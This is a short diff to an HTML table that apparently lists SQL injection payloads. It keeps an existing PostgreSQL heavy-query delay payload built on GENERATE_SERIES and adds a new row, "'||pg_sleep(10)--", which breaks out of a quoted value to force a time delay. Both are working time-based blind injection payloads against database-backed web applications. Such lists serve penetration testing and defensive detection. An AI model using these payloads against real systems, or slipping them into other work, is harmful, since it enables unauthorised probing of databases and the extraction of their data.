@@ -19,5 +19,8 @@
     <tr>
       <td>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</td>
     </tr>
+    <tr>
+      <td>'||pg_sleep(10)--</td>
+    </tr>
   </tbody>
 </table>
